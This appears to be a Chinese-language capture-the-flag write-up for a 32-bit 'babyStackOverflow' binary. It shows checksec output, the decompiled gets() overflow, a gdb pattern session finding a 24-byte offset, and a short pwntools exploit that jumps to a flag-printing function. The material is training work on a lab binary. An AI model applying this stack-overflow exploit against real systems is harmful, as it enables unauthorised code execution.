# 考察点

nop, real babyStackOverflow

# 分析

踩点
```shell
➜  tu_19_thefirst ./thefirst 
Let's see what you can do
> get me the flag           # 输入
➜  tu_19_thefirst file ./thefirst 
./thefirst: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d5cdb22c21ed1fe37f1d5d30ba2ddb7c03e34e9a, for GNU/Linux 3.2.0, not stripped
➜  tu_19_thefirst checksec ./thefirst 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/Stack/tu_19_thefirst/thefirst'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled      # ret2shell 失效
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[16]; // [esp+0h] [ebp-14h] BYREF

  setvbuf(stdout, 0, 2, 0x14u);
  setvbuf(stdin, 0, 2, 0x14u);
  printf("Let's see what you can do\n> ");
  gets(s);
  return 0;
}
```
还发现如下函数：
```c
int printFlag()
{
  return system("/bin/cat ./flag.txt");
}
```


```shell
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ c   
The program is not being run.
gdb-peda$ r
Starting program: /home/pitta/workspace/pwn_learn/rec0rd/Stack/tu_19_thefirst/thefirst 
Let's see what you can do
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41434141 ('AACA')
ECX: 0xf7fb55a0 --> 0xfbad208b 
EDX: 0xf7fb687c --> 0x0 
ESI: 0xf7fb5000 --> 0x1b2db0 
EDI: 0xf7fb5000 --> 0x1b2db0 
EBP: 0x41412d41 ('A-AA')
ESP: 0xffffd0b0 ("AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x44414128 ('(AAD')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x44414128
[------------------------------------stack-------------------------------------]
0000| 0xffffd0b0 ("AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd0b4 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd0b8 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd0bc ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd0c0 ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd0c4 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd0c8 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd0cc ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x44414128 in ?? ()
gdb-peda$ pattern offset 44414128
44414128 not found in pattern buffer
gdb-peda$ pattern offset 0x44414128
1145127208 found at offset: 24      # offset
```

# exp

```python
from pwn import *
pipe = process("./thefirst")

printFlag_entry = 0x080491FA
payload = "A" * 24
payload += p32(printFlag_entry)
pipe.sendline(payload)
print(pipe.recvall())

```
